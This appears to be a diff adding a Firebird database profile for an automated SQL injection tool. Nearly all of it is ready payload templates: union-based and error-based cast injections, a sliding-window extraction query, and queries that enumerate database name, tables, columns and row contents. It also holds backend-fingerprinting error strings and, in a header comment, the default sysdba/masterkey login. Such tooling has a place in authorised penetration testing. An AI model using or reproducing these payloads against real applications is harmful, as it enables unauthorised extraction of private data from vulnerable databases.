@@ -1,0 +1,117 @@
+vendor: Firebird
+# Service Firebird Server - DefaultInstance
+# jdbc:firebirdsql://127.0.0.1:3050/E:/Dev/Firebird/Firebird-2.5.9.27139-0_x64/examples/empbuild/EMPLOYEE.FDB
+# sysdba masterkey
+
+resource:
+ info: |
+  select
+      rdb$get_context('system', 'engine_version')
+      || '${enclose_value_sql}'
+      || rdb$get_context('system', 'db_name')
+      || '${enclose_value_sql}'
+      || rdb$get_context('system', 'current_user')
+      || '${trail_sql}'
+  from rdb$database
+
+ schema:
+  database: |
+   /**
+    * aggreg function return exec fault
+    * select item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations rows 2 to 2)-- 0x0000000100000000
+    * => use limit 1,1 instead
+    */
+   select
+       '${enclose_value_sql}'
+       || rdb$get_context('system', 'db_name')
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+   from rdb$database
+   ${limit}
+
+  table: |
+   select
+       '${enclose_value_sql}'
+       || trim(rdb$relation_name)
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+   from rdb$relations
+   ${limit}
+
+  column: |
+   select
+       '${enclose_value_sql}'
+       || trim(rdb$field_name)
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+   from rdb$relation_fields
+   where rdb$relation_name = '${table}'
+   ${limit}
+
+  row:
+   query: |
+    select
+        '${enclose_value_sql}'
+        || ${fields}
+        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+    from ${table}
+    ${limit}
+   fields:
+    field: trim(coalesce(${field.value}, ''))
+    concat: "|| '%7f' ||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   select
+       /**
+        * If reach end of string (${lead}i) then NULLIF nullifies the result
+        */
+       '${lead}'
+       || nullif(
+           substring(
+               (${injection})
+               from ${window.char}
+               for 65536
+           ),
+           '${trail_sql}'
+       )
+       from rdb$database
+  limit: rows ${limit.value} to ${limit.value}
+  failsafe: (1337${indice}7330%2b1)
+  # calibrator fine at 1024, except for Error strategy
+  calibrator: |
+   rpad(
+       '${calibrator_sql}',
+       48,
+       '${calibrator_sql}'
+   )
+  limitBoundary: 1
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    - 'Warning: ibase_query()'
+    - function.ibase-query
+    - Unexpected end of command - line
+   orderByErrorMessage:
+    - Invalid column position used in the ORDER BY clause
+
+ normal:
+  indices: union select ${indices} from rdb$database
+  capacity: (select '${lead}${indice}' || ${calibrator} from rdb\$database)
+  orderBy: order by 1337
+  
+ error:
+  method:
+  
+   - name: Cast:or
+     query: |
+      /* GDS Exception. 335544334. conversion error from string "<sqli>" */
+      or 1=(
+          ${window}
+      )
+     capacity: 52
+  
+   - name: Cast:and
+     query: |
+      and 1=(
+          ${window}
+      )
+     capacity: 52
